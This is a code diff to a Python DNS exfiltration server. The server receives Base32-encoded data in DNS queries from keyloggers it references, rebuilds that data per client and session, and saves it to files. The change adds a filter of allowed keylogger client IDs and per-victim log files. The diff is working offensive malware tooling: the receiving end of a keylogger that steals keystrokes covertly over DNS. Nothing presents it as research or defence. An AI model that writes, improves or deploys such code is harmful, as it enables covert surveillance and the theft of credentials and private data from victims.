@@ -2,6 +2,7 @@
 """
 DNS exfiltration server for domain
 Receives A queries, decodes Base32, reconstructs logs per client and session.
+Filters allowed CLIENT_IDs to ignore noise from unrelated queries.
 """
 
 import socket
@@ -13,10 +14,13 @@ from datetime import datetime
 from collections import defaultdict
 
 EXFIL_DOMAIN = ""                    # your NS-delegated subdomain same as in keylogger.py
-OUTPUT_FILE = "exfiltrated_log.txt"
 LISTEN_IP = "0.0.0.0"
 LISTEN_PORT = 53
 
+# --- Allowed client IDs (set your own IDs here) ---
+ALLOWED_CLIENTS = {0, 100}       # Replace with actual IDs used in your keyloggers
+
+# sessions structure: key=(client_id, session_id) -> {'chunks': dict, 'last_update': time}
 sessions = defaultdict(lambda: {'chunks': {}, 'last_update': time.time()})
 
 def build_dns_response(transaction_id, query_domain):
@@ -68,6 +72,13 @@ def process_query(data, addr, sock):
     if len(decoded) < 4:
         return
     client_id = (decoded[0] << 8) | decoded[1]
+
+    # --- FILTER: ignore unknown client IDs ---
+    if client_id not in ALLOWED_CLIENTS:
+        # Optionally log a message (disabled by default to reduce noise)
+        # print(f"[-] Rejected query from unknown client {client_id}")
+        return
+
     session_id = decoded[2]
     seq = decoded[3]
     chunk = decoded[4:]
@@ -87,10 +98,11 @@ def finalize_old_sessions():
         if now - sess['last_update'] > timeout and sess['chunks']:
             sorted_data = [sess['chunks'][s] for s in sorted(sess['chunks'].keys())]
             full_data = b"".join(sorted_data).decode("utf-8", errors="replace")
-            with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
+            filename = f"client_{client_id}.log"
+            with open(filename, "a", encoding="utf-8") as f:
                 f.write(f"\n--- Client {client_id}, session {session_id} ({datetime.now().isoformat()}) ---\n")
                 f.write(full_data)
-            print(f"[+] Saved client {client_id}, session {session_id} ({len(full_data)} chars)")
+            print(f"[+] Saved client {client_id}, session {session_id} to {filename} ({len(full_data)} chars)")
             to_remove.append((client_id, session_id))
     for key in to_remove:
         del sessions[key]
@@ -104,6 +116,7 @@ def main():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind((LISTEN_IP, LISTEN_PORT))
     print(f"[*] Listening on {LISTEN_IP}:{LISTEN_PORT}/UDP for *.{EXFIL_DOMAIN}")
+    print(f"[*] Allowed client IDs: {ALLOWED_CLIENTS}")
     cleaner = threading.Thread(target=session_cleaner, daemon=True)
     cleaner.start()
     while True:
